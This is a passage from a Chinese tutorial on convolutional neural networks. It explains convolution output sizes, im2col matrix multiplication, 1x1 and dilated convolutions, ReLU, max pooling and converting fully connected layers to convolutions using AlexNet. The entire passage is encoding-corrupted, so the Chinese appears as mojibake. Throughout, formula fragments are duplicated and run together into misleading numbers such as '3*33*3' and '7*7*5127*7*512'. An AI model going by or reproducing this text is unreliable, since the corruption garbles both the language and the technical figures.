ä¸º3Dæ•°æ®éš¾ä»¥å¯è§†åŒ–ï¼Œæ‰€ä»¥æ‰€æœ‰çš„æ•°æ®ï¼ˆè¾“å…¥æ•°æ®ä½“æ˜¯è“è‰²ï¼Œæƒé‡æ•°æ®ä½“æ˜¯çº¢è‰²ï¼Œè¾“å‡ºæ•°æ®ä½“æ˜¯ç»¿è‰²ï¼‰éƒ½é‡‡å–å°†æ·±åº¦åˆ‡ç‰‡æŒ‰ç…§åˆ—çš„æ–¹å¼æ’åˆ—å±•ç°ã€‚è¾“å…¥æ•°æ®ä½“çš„å°ºå¯¸æ˜¯W1=5ï¼ŒH1=5ï¼ŒD1=3ï¼ŒW1=5ï¼ŒH1=5ï¼ŒD1=3ï¼Œå·ç§¯å±‚å‚æ•°K=2ï¼ŒF=3ï¼ŒS=2ï¼ŒP=1ï¼ŒK=2ï¼ŒF=3ï¼ŒS=2ï¼ŒP=1ã€‚å°±æ˜¯è¯´ï¼Œæœ‰2ä¸ªæ»¤æ³¢å™¨ï¼Œæ»¤æ³¢å™¨çš„å°ºå¯¸æ˜¯3*33*3ï¼Œå®ƒä»¬çš„æ­¥é•¿æ˜¯2ã€‚å› æ­¤ï¼Œè¾“å‡ºæ•°æ®ä½“çš„ç©ºé—´å°ºå¯¸æ˜¯(5âˆ’3+2)/2+1=3(5âˆ’3+2)/2+1=3ã€‚æ³¨æ„è¾“å…¥æ•°æ®ä½“ä½¿ç”¨äº†é›¶å¡«å……P=1ï¼Œæ‰€ä»¥è¾“å…¥æ•°æ®ä½“å¤–è¾¹ç¼˜ä¸€åœˆéƒ½æ˜¯0ã€‚ä¸‹é¢çš„ä¾‹å­åœ¨ç»¿è‰²çš„è¾“å‡ºæ¿€æ´»æ•°æ®ä¸Šå¾ªç¯æ¼”ç¤ºï¼Œå±•ç¤ºäº†å…¶ä¸­æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å…ˆé€šè¿‡è“è‰²çš„è¾“å…¥æ•°æ®å’Œçº¢è‰²çš„æ»¤æ³¢å™¨é€å…ƒç´ ç›¸ä¹˜ï¼Œç„¶åæ±‚å…¶æ€»å’Œï¼Œæœ€ååŠ ä¸Šåå·®å¾—æ¥ã€‚ å·ç§¯æ“ä½œå½¢å¼ å·ç§¯æ“ä½œçš„å½¢å¼æ¯”è¾ƒå¤šï¼Œè¿™é‡Œä¸»è¦ä»‹ç»ä¸‰ç‚¹ï¼šçŸ©é˜µä¹˜æ³•å®ç°å·ç§¯ã€1*1å·ç§¯ã€æ‰©å¼ å·ç§¯ã€‚ ç”¨çŸ©é˜µä¹˜æ³•å®ç°å·ç§¯ å·ç§¯è¿ç®—æœ¬è´¨ä¸Šå°±æ˜¯åœ¨æ»¤æ³¢å™¨å’Œè¾“å…¥æ•°æ®çš„å±€éƒ¨åŒºåŸŸé—´åšç‚¹ç§¯ã€‚å·ç§¯å±‚çš„å¸¸ç”¨å®ç°æ–¹å¼å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå°†å·ç§¯å±‚çš„å‰å‘ä¼ æ’­å˜æˆä¸€ä¸ªå·¨å¤§çš„çŸ©é˜µä¹˜æ³•ã€‚ (1) è¾“å…¥å›¾åƒçš„å±€éƒ¨åŒºåŸŸè¢«im2coim2colæ“ä½œæ‹‰ä¼¸ä¸ºåˆ—ã€‚æ¯”å¦‚è¾“å…¥æ˜¯[227x227x3]ï¼Œè¦ä¸å°ºå¯¸ä¸º11x11x3çš„æ»¤æ³¢å™¨ä»¥æ­¥é•¿ä¸º4è¿›è¡Œå·ç§¯ï¼Œå°±ä¾æ¬¡å–è¾“å…¥ä¸­çš„[11x11x3]æ•°æ®å—ï¼Œç„¶åå°†å…¶æ‹‰ä¼¸ä¸ºé•¿åº¦ä¸º11x11x3=363çš„åˆ—å‘é‡ã€‚é‡å¤è¿›è¡Œè¿™ä¸€è¿‡ç¨‹ï¼Œå› ä¸ºæ­¥é•¿ä¸º4 ï¼Œæ‰€ä»¥ç»è¿‡å·ç§¯åçš„å®½å’Œé«˜å‡ä¸º(227-11)/4+1=55ï¼Œå…±æœ‰55x55=3,025ä¸ªç¥ç»å…ƒã€‚å› ä¸ºæ¯ä¸€ä¸ªç¥ç»å…ƒå®é™…ä¸Šéƒ½æ˜¯å¯¹åº”æœ‰363çš„åˆ—å‘é‡æ„æˆçš„æ„Ÿå—é‡ï¼Œå³ä¸€å…±è¦ä»è¾“å…¥ä¸Šå–å‡º3025ä¸ª363ç»´çš„åˆ—å‘é‡ã€‚æ‰€ä»¥ç»è¿‡im2colæ“ä½œå¾—åˆ°çš„è¾“å‡ºçŸ©é˜µçš„å°ºå¯¸æ˜¯[363x3025]ï¼Œå…¶ä¸­æ¯åˆ—æ˜¯æ‹‰ä¼¸çš„æ„Ÿå—é‡ã€‚æ³¨æ„å› ä¸ºæ„Ÿå—é‡ä¹‹é—´æœ‰é‡å ï¼Œæ‰€ä»¥è¾“å…¥æ•°æ®ä½“ä¸­çš„æ•°å­—åœ¨ä¸åŒçš„åˆ—ä¸­å¯èƒ½æœ‰é‡å¤ã€‚ (2) å·ç§¯å±‚çš„æƒé‡ä¹ŸåŒæ ·è¢«æ‹‰ä¼¸æˆè¡Œã€‚ä¸¾ä¾‹ï¼šå¦‚æœæœ‰96ä¸ªå°ºå¯¸ä¸º[11x11x3]çš„æ»¤æ³¢å™¨ï¼Œå°±ç”Ÿæˆä¸€ä¸ªçŸ©é˜µï¼Œå°ºå¯¸ä¸º[96x363]ã€‚ (3) ç°åœ¨å·ç§¯çš„ç»“æœå’Œè¿›è¡Œä¸€ä¸ªå¤§çŸ©é˜µä¹˜æ³•np.dot(Wrow,Xcol)np.dot(Wrow,Xcol)æ˜¯ç­‰ä»·çš„äº†ï¼Œèƒ½å¾—åˆ°æ¯ä¸ªæ»¤æ³¢å™¨å’Œæ¯ä¸ªæ„Ÿå—é‡é—´çš„ç‚¹ç§¯ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œè¿™ä¸ªæ“ä½œçš„è¾“å‡ºæ˜¯[96x3025]ï¼Œç»™å‡ºäº†æ¯ä¸ªæ»¤æ³¢å™¨åœ¨æ¯ä¸ªä½ç½®çš„ç‚¹ç§¯è¾“å‡ºã€‚æ³¨æ„å…¶ä¸­çš„np.dotnp.dotè®¡ç®—çš„æ˜¯çŸ©é˜µä¹˜æ³•è€Œä¸æ˜¯ç‚¹ç§¯ã€‚ (4) ç»“æœæœ€åå¿…é¡»è¢«é‡æ–°å˜ä¸ºåˆç†çš„è¾“å‡ºå°ºå¯¸[55x55x96]ã€‚ è¿™ä¸ªæ–¹æ³•çš„ç¼ºç‚¹å°±æ˜¯å ç”¨å†…å­˜å¤ªå¤šï¼Œå› ä¸ºåœ¨è¾“å…¥æ•°æ®ä½“ä¸­çš„æŸäº›å€¼åœ¨XcolXcolä¸­è¢«å¤åˆ¶äº†å¤šæ¬¡ï¼›ä¼˜ç‚¹åœ¨äºçŸ©é˜µä¹˜æ³•æœ‰éå¸¸å¤šçš„é«˜æ•ˆåº•å±‚å®ç°æ–¹å¼ã€‚ 1*1å·ç§¯ å…·æœ‰ä¿¡å·å¤„ç†ä¸“ä¸šçŸ¥è¯†çš„äººåˆšå¼€å§‹çœ‹è§è¿™ä¸ª1*1å·ç§¯çš„æ—¶å€™å¯èƒ½ä¼šæ¯”è¾ƒå›°æƒ‘ï¼Œå› ä¸ºä¿¡å·æ˜¯2ç»´çš„ï¼Œæ‰€ä»¥1*1å·ç§¯å°±æ²¡æœ‰æ„ä¹‰ã€‚ä½†æ˜¯ï¼Œåœ¨å·ç§¯ç¥ç»ç½‘ç»œä¸­ä¸æ˜¯è¿™æ ·ï¼Œå› ä¸ºè¿™é‡Œæ˜¯å¯¹3ä¸ªç»´åº¦è¿›è¡Œæ“ä½œï¼Œæ»¤æ³¢å™¨å’Œè¾“å…¥æ•°æ®ä½“çš„æ·±åº¦æ˜¯ä¸€æ ·çš„ã€‚æ¯”å¦‚ï¼Œå¦‚æœè¾“å…¥æ˜¯[32x32x3]ï¼Œé‚£ä¹ˆ1*1å·ç§¯å°±æ˜¯åœ¨é«˜æ•ˆåœ°è¿›è¡Œ3ç»´ç‚¹ç§¯ï¼ˆå› ä¸ºè¾“å…¥æ·±åº¦æ˜¯3ä¸ªé€šé“ï¼‰ï¼›å¦å¤–çš„ä¸€ç§æƒ³æ³•æ˜¯å°†è¿™ç§å·ç§¯çš„ç»“æœçœ‹ä½œæ˜¯å…¨è¿æ¥å±‚çš„ä¸€ç§å®ç°æ–¹å¼ï¼Œåé¢è®²åˆ°å…¨è¿æ¥å±‚ä¼šæåˆ°ã€‚ æ‰©å¼ å·ç§¯ æˆ‘ä»¬å‰é¢æåˆ°çš„æ»¤æ³¢å™¨éƒ½æ˜¯è¿ç»­çš„ï¼Œä½†æ˜¯ï¼Œè®©æ»¤æ³¢å™¨ä¸­å…ƒç´ ä¹‹é—´æœ‰é—´éš™ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿™å°±å«åšæ‰©å¼ ï¼Œå¦‚å›¾ï¼š åœ¨æŸäº›è®¾ç½®ä¸­ï¼Œæ‰©å¼ å·ç§¯ä¸æ­£å¸¸å·ç§¯ç»“åˆèµ·æ¥éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºè¿™å¯ä»¥åœ¨å¾ˆå°‘çš„å±‚æ•°å†…æ›´å¿«åœ°æ±‡é›†è¾“å…¥å›¾ç‰‡çš„å¤§å°ºåº¦ç‰¹å¾ã€‚æ¯”å¦‚ï¼Œå¦‚æœä¸Šä¸‹é‡å 2ä¸ª3*3çš„å·ç§¯å±‚ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå·ç§¯å±‚çš„ç¥ç»å…ƒçš„æ„Ÿå—é‡æ˜¯è¾“å…¥æ•°æ®ä½“ä¸­5*5çš„åŒºåŸŸï¼ˆå¯ä»¥ç§°è¿™äº›ç¥ç»å…ƒçš„æœ‰æ•ˆæ„Ÿå—é‡æ˜¯5*5ï¼‰ã€‚å¦‚æœæˆ‘ä»¬å¯¹å·ç§¯è¿›è¡Œæ‰©å¼ ï¼Œé‚£ä¹ˆè¿™ä¸ªæœ‰æ•ˆæ„Ÿå—é‡å°±ä¼šè¿…é€Ÿå¢é•¿ã€‚ è‡³æ­¤ï¼Œå¯¹å·ç§¯å±‚çš„å­¦ä¹ å‘Šä¸€æ®µè½ï¼Œä¸‹ä¸€å±‚æ˜¯æ± åŒ–å±‚ã€‚ ReLUå±‚ä¹Ÿç§°çº¿æ€§æ•´æµå±‚ï¼ˆRectified Linear Units layer, ReLU layerï¼‰ï¼Œä½¿ç”¨çº¿æ€§æ•´æµå‡½æ•°ï¼ˆRectified Linear Units, ReLUï¼‰f(x)=max(0,x)ä½œä¸ºè¿™ä¸€å±‚ç¥ç»çš„æ¿€åŠ±å‡½æ•°ï¼ˆActivation functionï¼‰ã€‚å®ƒå¯ä»¥å¢å¼ºåˆ¤å®šå‡½æ•°å’Œæ•´ä¸ªç¥ç»ç½‘ç»œçš„éçº¿æ€§ç‰¹æ€§ï¼Œè€Œæœ¬èº«å¹¶ä¸ä¼šæ”¹å˜å·ç§¯å±‚ã€‚ äº‹å®ä¸Šï¼Œå…¶ä»–çš„ä¸€äº›å‡½æ•°ä¹Ÿå¯ä»¥ç”¨äºå¢å¼ºç½‘ç»œçš„éçº¿æ€§ç‰¹æ€§ï¼Œå¦‚åŒæ›²æ­£åˆ‡å‡½æ•° f(x)=tanh(x)ã€f(x)=|tanh(x)|ï¼Œæˆ–è€…Sigmoidå‡½æ•°f(x)=(1+e^(-x))^(-1)ã€‚ç›¸æ¯”å…¶å®ƒå‡½æ•°æ¥è¯´ï¼ŒReLUå‡½æ•°æ›´å—é’çï¼Œè¿™æ˜¯å› ä¸ºå®ƒå¯ä»¥å°†ç¥ç»ç½‘ç»œçš„è®­ç»ƒé€Ÿåº¦æå‡æ•°å€ï¼Œè€Œå¹¶ä¸ä¼šå¯¹æ¨¡å‹çš„æ³›åŒ–å‡†ç¡®åº¦é€ æˆæ˜¾è‘—å½±å“ã€‚ æ± åŒ–å±‚é€šå¸¸åœ¨è¿ç»­çš„å·ç§¯å±‚ä¹‹é—´ä¼šå‘¨æœŸæ€§åœ°æ’å…¥ä¸€ä¸ªæ± åŒ–å±‚ï¼ˆPoolingï¼‰ï¼Œå®ƒçš„ä½œç”¨æ˜¯é€æ¸é™ä½æ•°æ®ä½“çš„ç©ºé—´å°ºå¯¸ï¼Œè¿™æ ·çš„è¯å°±èƒ½å‡å°‘ç½‘ç»œä¸­å‚æ•°çš„æ•°é‡ï¼Œä½¿å¾—è®¡ç®—èµ„æºè€—è´¹å˜å°‘ï¼Œä¹Ÿèƒ½æœ‰æ•ˆæ§åˆ¶è¿‡æ‹Ÿåˆã€‚å¦‚ä¸‹å›¾ï¼š æ± åŒ–å±‚ä½¿ç”¨MAXæ“ä½œï¼Œå¯¹è¾“å…¥æ•°æ®ä½“çš„æ¯ä¸€ä¸ªæ·±åº¦åˆ‡ç‰‡ç‹¬ç«‹è¿›è¡Œæ“ä½œï¼Œæ”¹å˜å®ƒçš„ç©ºé—´å°ºå¯¸ã€‚æœ€å¸¸è§çš„å½¢å¼æ˜¯ä½¿ç”¨å°ºå¯¸2*2çš„æ»¤æ³¢å™¨ï¼Œä»¥æ­¥é•¿ä¸º2æ¥å¯¹æ¯ä¸ªæ·±åº¦åˆ‡ç‰‡è¿›è¡Œé™é‡‡æ ·ï¼Œå°†å…¶ä¸­75%çš„æ¿€æ´»ä¿¡æ¯éƒ½ä¸¢æ‰ã€‚æ¯ä¸ªMAXæ“ä½œæ˜¯ä»4ä¸ªæ•°å­—ä¸­å–æœ€å¤§å€¼ï¼ˆä¹Ÿå°±æ˜¯åœ¨æ·±åº¦åˆ‡ç‰‡ä¸­æŸä¸ª2*2çš„åŒºåŸŸï¼‰ï¼Œæ·±åº¦ä¿æŒä¸å˜ã€‚ æ± åŒ–å±‚çš„è®¡ç®—ï¼šè¾“å…¥æ•°æ®ä½“å°ºå¯¸W1*H1*D1ï¼Œæœ‰ä¸¤ä¸ªè¶…å‚æ•°ï¼šç©ºé—´å¤§å°Få’Œæ­¥é•¿Sï¼›è¾“å‡ºæ•°æ®ä½“çš„å°ºå¯¸W2*H2*D2ï¼Œå…¶ä¸­ï¼š è¿™é‡Œé¢ä¸ä¹‹å‰çš„å·ç§¯çš„å°ºå¯¸è®¡ç®—çš„åŒºåˆ«ä¸»è¦åœ¨äºä¸¤ç‚¹ï¼šé¦–å…ˆåœ¨æ± åŒ–çš„è¿‡ç¨‹ä¸­åŸºæœ¬ä¸ä¼šè¿›è¡Œå¦è¡¥å……ï¼›å…¶æ¬¡æ± åŒ–å‰åæ·±åº¦ä¸å˜ã€‚ æ™®é€šæ± åŒ–ï¼ˆGeneral Poolingï¼‰ï¼šé™¤äº†å¸¸ç”¨çš„æœ€å¤§æ± åŒ–ï¼Œæ± åŒ–å•å…ƒè¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–çš„å‡½æ•°ï¼Œæ¯”å¦‚å¹³å‡æ± åŒ–ï¼ˆaverage poolingï¼‰æˆ–L-2èŒƒå¼æ± åŒ–ï¼ˆL2-norm poolingï¼‰ã€‚å¹³å‡æ± åŒ–å†å²ä¸Šæ¯”è¾ƒå¸¸ç”¨ï¼Œä½†æ˜¯ç°åœ¨å·²ç»å¾ˆå°‘ä½¿ç”¨äº†ã€‚å› ä¸ºå®è·µè¯æ˜ï¼Œæœ€å¤§æ± åŒ–çš„æ•ˆæœæ¯”å¹³å‡æ± åŒ–è¦å¥½ã€‚ åå‘ä¼ æ’­ï¼šå›é¡¾ä¸€ä¸‹åå‘ä¼ æ’­çš„å†…å®¹ï¼Œå…¶ä¸­max(x,y)å‡½æ•°çš„åå‘ä¼ æ’­å¯ä»¥ç®€å•ç†è§£ä¸ºå°†æ¢¯åº¦åªæ²¿æœ€å¤§çš„æ•°å›ä¼ ã€‚å› æ­¤ï¼Œåœ¨å‘å‰ä¼ æ’­ç»è¿‡æ±‡èšå±‚çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šæŠŠæ± ä¸­æœ€å¤§å…ƒç´ çš„ç´¢å¼•è®°å½•ä¸‹æ¥ï¼ˆæœ‰æ—¶è¿™ä¸ªä¹Ÿå«ä½œé“å²”ï¼ˆswitchesï¼‰ï¼‰ï¼Œè¿™æ ·åœ¨åå‘ä¼ æ’­çš„æ—¶å€™æ¢¯åº¦çš„è·¯ç”±å°±å¾ˆé«˜æ•ˆã€‚ ä¸ä½¿ç”¨æ± åŒ–å±‚ï¼šæœ‰äº›æ—¶å€™ï¼Œè¢«å½“åšå›¾åƒå¤„ç†çš„é—®é¢˜å…¶å®ä¹Ÿå¹¶ä¸å®Œå…¨ç­‰åŒäºå›¾åƒå¤„ç†ï¼Œæ¯”å¦‚AlphaGoçš„ä¸‹å›´æ£‹ï¼šæ£‹ç›˜æ˜¯ä¸èƒ½æ‘˜é™¤ä¸€éƒ¨åˆ†ä½ç½®è¿›è¡Œç¼©å°çš„ï¼Œå› æ­¤ä¹Ÿå°±ä¸èƒ½è¿›è¡Œæ± åŒ–ï¼Œäº‹å®ä¸ŠAlphaGoä¹Ÿå¹¶æ²¡æœ‰é‡‡ç”¨æ± åŒ–å±‚ã€‚é€šè¿‡åœ¨å·ç§¯å±‚ä¸­ä½¿ç”¨æ›´å¤§çš„æ­¥é•¿æ¥é™ä½æ•°æ®ä½“çš„å°ºå¯¸ã€‚æœ‰å‘ç°è®¤ä¸ºæœ‰æ—¶å€™ï¼Œåœ¨è®­ç»ƒä¸€ä¸ªè‰¯å¥½çš„ç”Ÿæˆæ¨¡å‹æ—¶ï¼Œå¼ƒç”¨æ±‡èšå±‚ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚æ¯”å¦‚å˜åŒ–è‡ªç¼–ç å™¨ï¼ˆVAEsï¼švariational autoencodersï¼‰å’Œç”Ÿæˆæ€§å¯¹æŠ—ç½‘ç»œï¼ˆGANsï¼šgenerative adversarial networksï¼‰ã€‚æœªæ¥çš„å·ç§¯ç½‘ç»œç»“æ„ä¸­ï¼Œæ± åŒ–å±‚çš„å‘å±•è¿˜çœŸä¸èƒ½ç¡®å®šã€‚ å…¨è¿æ¥å±‚å…¨è¿æ¥å±‚ï¼ˆç®€ç§°FCï¼‰å°†æ¯ä¸€ä¸ªç»“ç‚¹éƒ½ä¸ä¸Šä¸€å±‚çš„æ‰€æœ‰ç»“ç‚¹ç›¸è¿ï¼Œç”¨æ¥æŠŠå‰è¾¹æå–åˆ°çš„ç‰¹å¾ç»¼åˆèµ·æ¥ã€‚å…¨è¿æ¥å±‚å¯ä»¥æ•´åˆå·ç§¯å±‚æˆ–è€…æ± åŒ–å±‚ä¸­å…·æœ‰ç±»åˆ«åŒºåˆ†æ€§çš„å±€éƒ¨ä¿¡æ¯ã€‚ ä¸ºäº†æå‡ CNN ç½‘ç»œæ€§èƒ½ï¼Œå…¨è¿æ¥å±‚æ¯ä¸ªç¥ç»å…ƒçš„æ¿€åŠ±å‡½æ•°ä¸€èˆ¬é‡‡ç”¨ReLUå‡½æ•°ã€‚æœ€åä¸€å±‚å…¨è¿æ¥å±‚çš„è¾“å‡ºå€¼è¢«ä¼ é€’ç»™ä¸€ä¸ªè¾“å‡ºï¼Œå¯ä»¥é‡‡ç”¨softmaxé€»è¾‘å›å½’ï¼ˆsoftmax regressionï¼‰è¿›è¡Œåˆ†ç±»ï¼Œè¯¥å±‚ä¹Ÿå¯ç§°ä¸ºsoftmaxå±‚ï¼ˆsoftmax layeï¼‰ã€‚ å°†å·ç§¯å±‚è½¬åŒ–ä¸ºå…¨è¿æ¥å±‚ å¯¹äºä»»ä¸€ä¸ªå·ç§¯å±‚ï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªèƒ½å®ç°å’Œå®ƒä¸€æ ·çš„å‰å‘ä¼ æ’­å‡½æ•°çš„å…¨è¿æ¥å±‚ã€‚è¯¥å…¨è¿æ¥å±‚çš„æƒé‡æ˜¯ä¸€ä¸ªå·¨å¤§çš„çŸ©é˜µï¼Œé™¤äº†æŸäº›ç‰¹å®šå—ï¼ˆæ„Ÿå—é‡ï¼‰ï¼Œå…¶ä½™éƒ¨åˆ†éƒ½æ˜¯0ï¼›è€Œåœ¨é0éƒ¨åˆ†ä¸­ï¼Œå¤§éƒ¨åˆ†å…ƒç´ éƒ½æ˜¯ç›¸ç­‰çš„ï¼ˆæƒå€¼å…±äº«ï¼‰ã€‚å¦‚æœæŠŠå…¨è¿æ¥å±‚è½¬åŒ–æˆå·ç§¯å±‚ï¼Œä»¥è¾“å‡ºå±‚çš„Deep11ä¸ºä¾‹ï¼Œä¸å®ƒæœ‰å…³çš„è¾“å…¥ç¥ç»å…ƒåªæœ‰ä¸Šé¢å››ä¸ªï¼Œæ‰€ä»¥åœ¨æƒé‡çŸ©é˜µä¸­ä¸å®ƒç›¸ä¹˜çš„å…ƒç´ ï¼Œé™¤äº†å®ƒæ‰€å¯¹åº”çš„4ä¸ªï¼Œå‰©ä¸‹çš„å‡ä¸º0ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆæƒé‡çŸ©é˜µä¸­æœ‰ä¸ºé›¶çš„éƒ¨åˆ†ã€‚å¦å¤–è¦æŠŠâ€œå°†å…¨è¿æ¥å±‚è½¬åŒ–æˆå·ç§¯å±‚â€å’Œâ€œç”¨çŸ©é˜µä¹˜æ³•å®ç°å·ç§¯â€åŒºåˆ«å¼€ï¼Œè¿™ä¸¤è€…æ˜¯ä¸åŒçš„ï¼Œåè€…æœ¬èº«è¿˜æ˜¯åœ¨è®¡ç®—å·ç§¯ï¼Œåªä¸è¿‡å°†å…¶å±•å¼€ä¸ºçŸ©é˜µç›¸ä¹˜çš„å½¢å¼ï¼Œå¹¶ä¸æ˜¯â€å°†å…¨è¿æ¥å±‚è½¬åŒ–æˆå·ç§¯å±‚â€ï¼Œæ‰€ä»¥é™¤éæƒé‡ä¸­æœ¬èº«æœ‰é›¶ï¼Œå¦åˆ™ç”¨çŸ©é˜µä¹˜æ³•å®ç°å·ç§¯çš„è¿‡ç¨‹ä¸­ä¸ä¼šå‡ºç°å€¼ä¸º0çš„æƒé‡ã€‚ å°†å…¨è¿æ¥å±‚è½¬åŒ–ä¸ºå·ç§¯å±‚ ä»»ä½•å…¨è¿æ¥å±‚éƒ½å¯ä»¥è¢«è½¬åŒ–ä¸ºå·ç§¯å±‚ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªK=4096çš„å…¨è¿æ¥å±‚ï¼Œè¾“å…¥æ•°æ®ä½“çš„å°ºå¯¸æ˜¯ 7*7*5127*7*512ï¼Œè¿™ä¸ªå…¨è¿æ¥å±‚å¯ä»¥è¢«ç­‰æ•ˆåœ°çœ‹åšä¸€ä¸ªF=7ï¼ŒP=0ï¼ŒS=1ï¼ŒK=4096ï¼ŒF=7ï¼ŒP=0ï¼ŒS=1ï¼ŒK=4096çš„å·ç§¯å±‚ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯å°†æ»¤æ³¢å™¨çš„å°ºå¯¸è®¾ç½®ä¸ºå’Œè¾“å…¥æ•°æ®ä½“çš„å°ºå¯¸è®¾ä¸ºä¸€è‡´çš„ã€‚å› ä¸ºåªæœ‰ä¸€ä¸ªå•ç‹¬çš„æ·±åº¦åˆ—è¦†ç›–å¹¶æ»‘è¿‡è¾“å…¥æ•°æ®ä½“ï¼Œæ‰€ä»¥è¾“å‡ºå°†å˜æˆ1*1*40961*1*4096ï¼Œè¿™ä¸ªç»“æœå°±å’Œä½¿ç”¨åˆå§‹çš„é‚£ä¸ªå…¨è¿æ¥å±‚ä¸€æ ·äº†ã€‚è¿™ä¸ªå®é™…ä¸Šä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå› ä¸ºï¼Œå¯¹äºå…¶ä¸­çš„ä¸€ä¸ªå·ç§¯æ»¤æ³¢å™¨ï¼Œè¿™ä¸ªæ»¤æ³¢å™¨çš„çš„æ·±åº¦ä¸º512ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè™½ç„¶è¿™ä¸ªå·ç§¯æ»¤æ³¢å™¨çš„è¾“å‡ºåªæœ‰1ä¸ªï¼Œä½†æ˜¯å®ƒçš„æƒé‡æœ‰7*7*5127*7*512ï¼Œç›¸å½“äºå·ç§¯æ»¤æ³¢å™¨çš„è¾“å‡ºä¸ºä¸€ä¸ªç¥ç»å…ƒï¼Œè¿™ä¸ªç¥ç»å…ƒä¸ä¸Šä¸€å±‚çš„æ‰€æœ‰ç¥ç»å…ƒç›¸è¿æ¥ï¼Œè€Œè¿™æ ·ä¸å‰ä¸€å±‚æ‰€æœ‰ç¥ç»å…ƒç›¸è¿æ¥çš„ç¥ç»å…ƒä¸€å…±æœ‰4096ä¸ªï¼Œè¿™ä¸å°±æ˜¯ä¸€ä¸ªå…¨è¿æ¥ç½‘ç»œã€‚ åœ¨ä¸Šè¿°çš„ä¸¤ç§å˜æ¢ä¸­ï¼Œå°†å…¨è¿æ¥å±‚è½¬åŒ–ä¸ºå·ç§¯å±‚åœ¨å®é™…è¿ç”¨ä¸­æ›´åŠ æœ‰ç”¨ã€‚å‡è®¾ä¸€ä¸ªå·ç§¯ç¥ç»ç½‘ç»œçš„è¾“å…¥æ˜¯224*224*3çš„å›¾åƒï¼Œä¸€ç³»åˆ—çš„å·ç§¯å±‚å’Œæ±‡èšå±‚å°†å›¾åƒæ•°æ®å˜ä¸ºå°ºå¯¸ä¸º7*7*512çš„æ¿€æ´»æ•°æ®ä½“ï¼ˆåœ¨AlexNetä¸­å°±æ˜¯è¿™æ ·ï¼Œé€šè¿‡ä½¿ç”¨5ä¸ªæ±‡èšå±‚æ¥å¯¹è¾“å…¥æ•°æ®è¿›è¡Œç©ºé—´ä¸Šçš„é™é‡‡æ ·ï¼Œæ¯æ¬¡å°ºå¯¸ä¸‹é™ä¸€åŠï¼Œæ‰€ä»¥æœ€ç»ˆç©ºé—´å°ºå¯¸ä¸º224/2/2/2/2/2=7ï¼‰ã€‚ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼ŒAlexNetä½¿ç”¨äº†ä¸¤ä¸ªå°ºå¯¸ä¸º4096çš„å…¨è¿æ¥å±‚ï¼Œæœ€åä¸€ä¸ªæœ‰1000ä¸ªç¥ç»å…ƒçš„å…¨è¿æ¥å±‚ç”¨äºè®¡ç®—åˆ†ç±»è¯„åˆ†ã€‚æˆ‘ä»¬å¯ä»¥å°†è¿™3ä¸ªå…¨è¿æ¥è½¬åŒ–ä¸º3ä¸ªå·ç§¯å±‚ï¼š (1) é’ˆå¯¹ç¬¬ä¸€ä¸ªè¿æ¥åŒºåŸŸæ˜¯[7x7x512]çš„å…¨è¿æ¥å±‚ï¼Œä»¤å…¶æ»¤æ³¢å™¨å°ºå¯¸ä¸ºF=7ï¼Œè¿™æ ·è¾“å‡ºæ•°æ®ä½“å°±ä¸º[1x1x4096]äº†ã€‚ (2) é’ˆå¯¹ç¬¬äºŒä¸ªå…¨è¿æ¥å±‚ï¼Œä»¤å…¶æ»¤æ³¢å™¨å°ºå¯¸ä¸ºF=1ï¼Œè¿™æ ·è¾“å‡ºæ•°æ®ä½“ä¸º[1x1x4096]ã€‚ (3) å¯¹æœ€åä¸€ä¸ªå…¨è¿æ¥å±‚ä¹Ÿåšç±»ä¼¼çš„ï¼Œä»¤å…¶F=1ï¼Œæœ€ç»ˆè¾“å‡ºä¸º[1x1x1000]ã€‚ è¿™æ ·åšçš„ç›®çš„æ˜¯è®©å·ç§¯ç½‘ç»œåœ¨ä¸€å¼ æ›´å¤§çš„è¾“å…¥å›¾ç‰‡ä¸Šæ»‘åŠ¨ï¼Œå¾—åˆ°å¤šä¸ªè¾“å‡ºï¼Œè¿™æ ·çš„è½¬åŒ–å¯ä»¥è®©æˆ‘ä»¬åœ¨å•ä¸ªå‘å‰ä¼ æ’­çš„è¿‡ç¨‹ä¸­å®Œæˆä¸Šè¿°çš„æ“ä½œã€‚ è‡³æ­¤ï¼Œå¯¹CNNå„å±‚çš„å­¦ä¹ æš‚æ—¶å‘Šä¸€æ®µè½ï¼Œæœ€èµ·ç æœ‰äº†ä¸€å®šçš„äº†è§£ã€‚ä¸‹é¢å°†å¯¹å„å±‚ä¹‹é—´çš„ç»“æ„è¿›è¡Œå­¦ä¹ ã€‚ å·ç§¯ç¥ç»ç½‘ç»œç»“æ„ç‰¹ç‚¹å·ç§¯ç¥ç»ç½‘ç»œé€šå¸¸æ˜¯ç”±ä¸‰ç§å±‚æ„æˆï¼šå·ç§¯å±‚ï¼Œæ± åŒ–å±‚ï¼ˆé™¤éç‰¹åˆ«è¯´æ˜ï¼Œä¸€èˆ¬å°±æ˜¯æœ€å¤§å€¼æ± åŒ–ï¼‰å’Œå…¨è¿æ¥å±‚ã€‚ReLUå±‚é€šå¸¸åœ¨å·ç§¯å±‚ä¹‹åï¼Œå®ƒé€å…ƒç´ åœ°è¿›è¡Œæ¿€æ´»å‡½æ•°æ“ä½œï¼Œå¸¸å¸¸å°†å®ƒä¸å·ç§¯å±‚çœ‹ä½œæ˜¯åŒä¸€å±‚ã€‚ å±‚çš„æ’åˆ—è§„å¾‹å·ç§¯ç¥ç»ç½‘ç»œæœ€å¸¸è§çš„å½¢å¼å°±æ˜¯å°†ä¸€äº›å·ç§¯å±‚å’ŒReLUå±‚æ”¾åœ¨ä¸€èµ·ï¼Œå…¶åç´§è·Ÿæ± 